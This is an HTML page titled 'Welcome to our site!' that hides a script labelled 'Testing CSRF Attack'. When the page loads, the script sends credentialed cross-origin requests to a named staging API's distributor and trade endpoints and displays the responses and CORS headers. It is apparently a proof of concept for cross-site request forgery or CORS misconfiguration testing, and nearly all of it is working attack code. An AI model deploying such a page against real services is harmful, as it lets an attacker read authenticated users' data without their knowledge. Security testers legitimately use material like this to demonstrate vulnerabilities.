<!DOCTYPE html>
<html>
<head>
    <title>Welcome to our site!</title>
</head>
<body>
    <h1>Welcome to our site!</h1>
    <p>Loading content...</p>
    
    <div id="results"></div>
    
    <script>
    async function testCSRF() {
        const results = document.getElementById('results');
        
        try {
            // Test 1: Try to access distributor endpoint (unauth)
            results.innerHTML += '<h3>Testing CSRF Attack...</h3>';
            
            const response = await fetch('https://ml-stage.farmartos.com/v3/distributer/fertilizer/', {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            
            const data = await response.text();
            results.innerHTML += `<p><strong>Response Status:</strong> ${response.status}</p>`;
            results.innerHTML += `<p><strong>Response:</strong> ${data.substring(0, 200)}...</p>`;
            
            // Test 2: Try to access protected endpoint
            const protectedResponse = await fetch('https://ml-stage.farmartos.com/v3/trade/', {
                method: 'GET',
                credentials: 'include'
            });
            
            results.innerHTML += `<p><strong>Protected Endpoint Status:</strong> ${protectedResponse.status}</p>`;
            
            // Test 3: Check CORS headers
            results.innerHTML += `<p><strong>CORS Allowed:</strong> ${response.headers.get('Access-Control-Allow-Origin') || 'Not set'}</p>`;
            
        } catch (error) {
            results.innerHTML += `<p><strong>Error:</strong> ${error.message}</p>`;
        }
    }
    
    // Execute when page loads
    window.onload = testCSRF;
    </script>
</body>
</html>
